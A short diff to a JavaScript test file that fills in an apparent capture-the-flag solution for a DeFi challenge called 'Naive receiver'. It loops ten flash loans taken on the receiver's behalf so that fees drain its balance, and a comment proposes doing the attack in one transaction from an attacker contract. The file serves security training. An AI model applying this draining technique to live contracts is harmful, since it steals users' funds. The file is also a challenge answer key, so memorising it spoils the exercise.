@@ -38,6 +38,12 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const token = await pool.ETH()
+
+        // Take 10 flash loans on behalf of `receiver`, discounting 1 ether (fee) of its balance each time.
+        // Could deploy an attacker contract that performs the attack in its constructor to make it in a single transaction.
+        for (let i = 0; i < 10; i++)
+            await pool.connect(player).flashLoan(receiver.address, token, 1, "0x")
     });
 
     after(async function () {
